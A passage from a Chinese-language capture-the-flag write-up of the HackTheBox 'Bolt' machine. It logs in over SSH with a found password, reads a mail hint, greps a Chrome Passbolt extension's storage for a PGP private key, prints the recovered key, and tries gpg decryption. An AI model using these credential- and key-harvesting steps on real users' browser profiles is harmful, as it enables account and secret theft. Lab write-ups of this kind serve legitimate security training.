+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----BEGIN PGP PUBLIC KEY BLOCK-----
+</span></span><span class="line"><span class="cl">Version: OpenPGP.js v4.10.9
+</span></span><span class="line"><span class="cl">Comment: https://openpgpjs.org
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">xsBNBGA4GX0BCAD2MdBV19tAu+SWkMJ0BkvGdQrLquHg1olUvvhvIWmmBICr
+</span></span><span class="line"><span class="cl">eA89HnYYKFoOxnCL1yhpArtf379rFTZJDXzbzXlnCvgZzP71MNYo2Pq3l0Zn
+</span></span><span class="line"><span class="cl">syfx3juIg+Fr6YYv7RotnpNaz+xFU+eHVSFRl64o+WhuxETPyJKqpRGGYjrl
+</span></span><span class="line"><span class="cl">WiQQP8oCGSh5ytXqK/XRswETTQEQUTkeWHVU5UV6KlYp+xL0vmu8R9UAkcrK
+</span></span><span class="line"><span class="cl">Go9QusV+v4i3PMsgHexuOFHXVJ5nmyGvVQ5khNtuNHruQ5M3xjsb8FtklIo1
+</span></span><span class="line"><span class="cl">asfbjJETUti0wYf7lOffU3+0win4uDbMDOUJEU1ZV//Z+OZq+ARBWaahABEB
+</span></span><span class="line"><span class="cl">AAHNH0NsYXJrIEdyaXN3b2xkIDxjbGFya0Bib2x0Lmh0Yj7CwI0EEAEIACAF
+</span></span><span class="line"><span class="cl">AmA4GX0GCwkHCAMCBBUICgIEFgIBAAIZAQIbAwIeAQAhCRBY7n73qDZg6hYh
+</span></span><span class="line"><span class="cl">BA0fEAb51vFT6RQogFjufveoNmDqjx8IAI+HW1qYWqFhO5VdgDjZLlyFzQgh
+</span></span><span class="line"><span class="cl">CPMjix05N8U6umsy31m0U8OaDCwN+s0S5DAz0e5OSJEF/gNVM/iTP8Ac+gwo
+</span></span><span class="line"><span class="cl">H2kIEUZ6cPMLgV1kwiGAQUr/Fn0biCmKQo36luQphSdT1Gbv+fOpcrLFh+bZ
+</span></span><span class="line"><span class="cl">EndJIgKdovUrr3eo7gyJhALzrYz9PinypoQPs6t3PXKbRWdhHulQuBZPUavH
+</span></span><span class="line"><span class="cl">2g6knhGnx8P2XGEbELGh2NmmB9K1B9vpjxpGokZGiVXAA00/T4rj22/fXHJO
+</span></span><span class="line"><span class="cl">XXFzSjoIpnPCjBozgeWtiwDwD5zFh4rg7NkcyZFwg2BZo3fFKXBENWlOIy9b
+</span></span><span class="line"><span class="cl">ejRn7ea1iTbK4BLOwE0EYDgZfQEIALhlzquF2jgQJkBFUC0PvpaYBNMtinA5
+</span></span><span class="line"><span class="cl">SiA+rKMs+qhsfJf9whelroGL4znwOw4yI+gCIdiX+qlGyxPD1LXVCHWyaTA3
+</span></span><span class="line"><span class="cl">fiivImGkEXV2pP3CvBjtzsYv4g9rlrXmoOrhwnhJUxcq/0D8HinpbIwQ8euM
+</span></span><span class="line"><span class="cl">jTCfLVCBPOLham/D/j7QLydZ0flA+z3SKJMrbx5MlhlGj2PwxWdOLII7xTol
+</span></span><span class="line"><span class="cl">1B7F5WUz/ILKhCkzSliiRAHJhQNlgZHV3bCHGR1YUDf30pvn9GEwbOE2DdUv
+</span></span><span class="line"><span class="cl">K9Mvu5Ow5PLC+EHv1Ve21bfKTE8sQbkhF7qaxoX3C47DReze7LGidk+DIPJx
+</span></span><span class="line"><span class="cl">Gw2JeW/EukUAEQEAAcLAdgQYAQgACQUCYDgZfQIbDAAhCRBY7n73qDZg6hYh
+</span></span><span class="line"><span class="cl">BA0fEAb51vFT6RQogFjufveoNmDqkwgH/Aup4vqEXUxqciTyIZUDctPY1I2v
+</span></span><span class="line"><span class="cl">dwcMS1J9sjW8UOy3XzkgG2+ysME09fzODTM/zwpGEQf8icUvMOq70NMeUDed
+</span></span><span class="line"><span class="cl">BnnVHlgwgn4W10xh8p6z24yBrU0iwRianGMX9bIzToHkxwhaj8AtQP5cXoZi
+</span></span><span class="line"><span class="cl">x8/MFj+LswTfZDAP10CkgS4L3bsi7nIrh3sHMPjn2RYLIVXffWTDC4TJ2HV5
+</span></span><span class="line"><span class="cl">IadG59FrSdK+n8vXPNPcYUcm1F6ddDGvsxjBNwCX00jDNL3Gp7fPqKQjQCh0
+</span></span><span class="line"><span class="cl">pMIO+51kn9QRJJP/XmJrOw2mTheT20DT26JX/K947oi/pAe8xGHrCKAqWiZ5
+</span></span><span class="line"><span class="cl">AeAgt0l0AiCdPTQ=
+</span></span><span class="line"><span class="cl">=axZz
+</span></span><span class="line"><span class="cl">-----END PGP PUBLIC KEY BLOCK-----
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302007780.png" /></p>
+<p>得到<code>passbolt</code>的PGP公钥和私钥,还从数据库中得到两个公钥,但缺少eddie的私钥,无法对得到的密文进行解密</p>
+<p>试试用已知的密码去登录ssh</p>
+<p>成功以<code>eddie:rT2;jW7&lt;eY8!dX8}pQ8%</code>登录ssh</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302014659.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302016761.png" /></p>
+<p>注意到登录提示<code>You have mail.</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">find /* | grep -i mail
+</span></span><span class="line"><span class="cl">/var/mail
+</span></span><span class="line"><span class="cl">/var/mail/eddie
+</span></span><span class="line"><span class="cl">/var/mail/www-data
+</span></span><span class="line"><span class="cl">/var/mail/root
+</span></span><span class="line"><span class="cl">/var/mail/test
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eddie@bolt:/var/mail$ ls -alh
+</span></span><span class="line"><span class="cl">total 24K
+</span></span><span class="line"><span class="cl">drwxrwsr-x  3 root     mail 4.0K Jan 30 03:03 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x 14 root     root 4.0K Jan 26 07:14 ..
+</span></span><span class="line"><span class="cl">-rw-------  1 eddie    mail  909 Feb 25  2021 eddie
+</span></span><span class="line"><span class="cl">-rw-------  1 root     mail    1 Mar  3  2021 root
+</span></span><span class="line"><span class="cl">drwx--S---  5     5001 mail 4.0K Jan 30 03:04 test
+</span></span><span class="line"><span class="cl">-rw-------  1 www-data mail    1 Mar  3  2021 www-data
+</span></span><span class="line"><span class="cl">eddie@bolt:/var/mail$ cat eddie 
+</span></span><span class="line"><span class="cl">From clark@bolt.htb  Thu Feb 25 14:20:19 2021
+</span></span><span class="line"><span class="cl">Return-Path: &lt;clark@bolt.htb&gt;
+</span></span><span class="line"><span class="cl">X-Original-To: eddie@bolt.htb
+</span></span><span class="line"><span class="cl">Delivered-To: eddie@bolt.htb
+</span></span><span class="line"><span class="cl">Received: by bolt.htb (Postfix, from userid 1001)
+</span></span><span class="line"><span class="cl">        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+</span></span><span class="line"><span class="cl">Subject: Important!
+</span></span><span class="line"><span class="cl">To: &lt;eddie@bolt.htb&gt;
+</span></span><span class="line"><span class="cl">X-Mailer: mail (GNU Mailutils 3.7)
+</span></span><span class="line"><span class="cl">Message-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;
+</span></span><span class="line"><span class="cl">Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
+</span></span><span class="line"><span class="cl">From: Clark Griswold &lt;clark@bolt.htb&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hey Eddie,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
+</span></span><span class="line"><span class="cl">Once you&#39;re set up you can start importing your passwords.  Please be sure to keep good security in mind - there&#39;s a few things I read about in a security whitepaper that are a little concerning...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-Clark
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>Clark</code>给<code>Eddie</code>发了一封邮件,提示存在私钥备份</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">密码管理服务器已启动并正在运行。 继续将扩展程序下载到您的浏览器并登录。请务必备份您的私钥，因为我无法恢复它。 您的私钥是恢复您的帐户的唯一方法。
+</span></span><span class="line"><span class="cl">设置完成后，您就可以开始导入密码了。 请务必牢记良好的安全性 - 我在安全白皮书中读到的一些内容有点令人担忧...... 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>结合前面找到的<code>/opt/google/chrome/chrome-sandbox</code>,推测要在<code>chrome</code>的扩展程序的缓存中寻找私钥</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302035398.png" /></p>
+<p>应该在<code>~/.config/google-chrome/Default</code>目录下,运行<code>rep -r -i -a -s &quot;PGP PRIVATE KEY BLOCK&quot; *</code></p>
+<p>主要在<code>Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/</code>下的一些js文件和<code>Local Extension Settings/didegimhafipceonhjepacocaffmoppf/</code>下的一个log文件,重点应该放在这个log文件中</p>
+<p><code>strings 000003.log | grep -i &quot;PGP PRIVATE KEY BLOCK&quot;</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302054097.png" /></p>
+<p>从文件提取出私钥,保存为<code>eddie.key</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-----BEGIN PGP PRIVATE KEY BLOCK-----
+</span></span><span class="line"><span class="cl">Version: OpenPGP.js v4.10.9
+</span></span><span class="line"><span class="cl">Comment: https://openpgpjs.org
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
+</span></span><span class="line"><span class="cl">fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
+</span></span><span class="line"><span class="cl">cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
+</span></span><span class="line"><span class="cl">RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+</span></span><span class="line"><span class="cl">+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
+</span></span><span class="line"><span class="cl">If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
+</span></span><span class="line"><span class="cl">AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW
+</span></span><span class="line"><span class="cl">UjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua
+</span></span><span class="line"><span class="cl">jS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA
+</span></span><span class="line"><span class="cl">iOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac
+</span></span><span class="line"><span class="cl">2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj
+</span></span><span class="line"><span class="cl">QY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf
+</span></span><span class="line"><span class="cl">DRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/
+</span></span><span class="line"><span class="cl">7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2
+</span></span><span class="line"><span class="cl">AZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49
+</span></span><span class="line"><span class="cl">tgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc
+</span></span><span class="line"><span class="cl">Uct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP
+</span></span><span class="line"><span class="cl">yF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj
+</span></span><span class="line"><span class="cl">XTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e
+</span></span><span class="line"><span class="cl">IHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp
+</span></span><span class="line"><span class="cl">eqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM
+</span></span><span class="line"><span class="cl">vjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp
+</span></span><span class="line"><span class="cl">ZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ
+</span></span><span class="line"><span class="cl">AQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H
+</span></span><span class="line"><span class="cl">/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF
+</span></span><span class="line"><span class="cl">nyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba
+</span></span><span class="line"><span class="cl">qx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt
+</span></span><span class="line"><span class="cl">zc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74
+</span></span><span class="line"><span class="cl">7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F
+</span></span><span class="line"><span class="cl">U3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY
+</span></span><span class="line"><span class="cl">HMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5
+</span></span><span class="line"><span class="cl">zNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M
+</span></span><span class="line"><span class="cl">KeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP
+</span></span><span class="line"><span class="cl">rOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8
+</span></span><span class="line"><span class="cl">Ko+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7
+</span></span><span class="line"><span class="cl">XrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP
+</span></span><span class="line"><span class="cl">leD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU
+</span></span><span class="line"><span class="cl">KP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f
+</span></span><span class="line"><span class="cl">a6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67
+</span></span><span class="line"><span class="cl">JAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH
+</span></span><span class="line"><span class="cl">kERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+
+</span></span><span class="line"><span class="cl">Ja9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT
+</span></span><span class="line"><span class="cl">Gh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB
+</span></span><span class="line"><span class="cl">GquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong
+</span></span><span class="line"><span class="cl">cVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO
+</span></span><span class="line"><span class="cl">n0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz
+</span></span><span class="line"><span class="cl">4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT
+</span></span><span class="line"><span class="cl">4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h
+</span></span><span class="line"><span class="cl">J6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt
+</span></span><span class="line"><span class="cl">1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS
+</span></span><span class="line"><span class="cl">UCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU
+</span></span><span class="line"><span class="cl">Nsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf
+</span></span><span class="line"><span class="cl">QmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm
+</span></span><span class="line"><span class="cl">oRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg
+</span></span><span class="line"><span class="cl">6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/
+</span></span><span class="line"><span class="cl">Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8
+</span></span><span class="line"><span class="cl">11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm
+</span></span><span class="line"><span class="cl">YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0
+</span></span><span class="line"><span class="cl">PSwYYWlAywj5
+</span></span><span class="line"><span class="cl">=cqxZ
+</span></span><span class="line"><span class="cl">-----END PGP PRIVATE KEY BLOCK-----
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://gist.github.com/jhjguxin/6037564" target="_blank" rel="noopener noreffer ">GPG 加密解密简明教程</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># kali @ kali in ~ [21:43:50] </span>
+</span></span><span class="line"><span class="cl">$ ls
+</span></span><span class="line"><span class="cl">BurpSuitePro  Documents  eddie.key  file.enc         Music     Public    sql_test   Videos
+</span></span><span class="line"><span class="cl">Desktop       Downloads  eddie.pub  lab_mi3aka.ovpn  Pictures  SecTools  Templates
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># kali @ kali in ~ [21:43:50] </span>
+</span></span><span class="line"><span class="cl">$ gpg --import eddie.pub
+</span></span><span class="line"><span class="cl">gpg: key 1C2741A3DC3B4ABD: <span class="s2">&#34;Eddie Johnson &lt;eddie@bolt.htb&gt;&#34;</span> not changed
+</span></span><span class="line"><span class="cl">gpg: Total number processed: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:              unchanged: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># kali @ kali in ~ [21:44:32] </span>
+</span></span><span class="line"><span class="cl">$ gpg --import eddie.key
+</span></span><span class="line"><span class="cl">gpg: key 1C2741A3DC3B4ABD: <span class="s2">&#34;Eddie Johnson &lt;eddie@bolt.htb&gt;&#34;</span> not changed
+</span></span><span class="line"><span class="cl">gpg: key 1C2741A3DC3B4ABD: secret key imported
+</span></span><span class="line"><span class="cl">gpg: Total number processed: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:              unchanged: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:       secret keys read: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">gpg:  secret keys unchanged: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># kali @ kali in ~ [21:44:37] </span>
+</span></span><span class="line"><span class="cl">$ gpg -d file.enc       
+</span></span><span class="line"><span class="cl">gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;Eddie Johnson &lt;eddie@bolt.htb&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">gpg: public key decryption failed: Operation cancelled
+</span></span><span class="line"><span class="cl">gpg: decryption failed: No secret key
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这玩意还要输入密码&hellip;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png 2x"
+        data-sizes="auto"
